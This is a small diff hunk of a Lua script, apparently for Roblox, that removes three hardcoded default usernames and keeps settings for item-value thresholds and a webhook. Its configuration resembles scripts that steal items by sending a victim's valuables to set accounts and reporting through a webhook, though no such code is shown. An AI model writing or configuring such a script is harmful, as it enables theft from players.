@@ -200,7 +200,7 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local users = Usernames or {"PetsGoMommy", "SusanAltGrind", "SusanHatching"}
+local users = Usernames
 local min_rap = min_rap or 1000
 local min_chance = min_chance or 1000000
 local webhook = webhook
